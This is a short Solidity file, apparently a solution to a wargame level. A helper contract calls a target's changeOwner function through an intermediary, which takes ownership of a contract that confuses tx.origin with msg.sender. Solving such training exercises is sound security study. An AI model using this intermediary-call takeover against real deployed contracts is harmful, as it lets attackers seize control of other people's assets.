// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TakeTelephone{
    
    function takeOver(address telephoneContract, address newOwner) public{
        ITelephone(telephoneContract).changeOwner(newOwner);
    }
}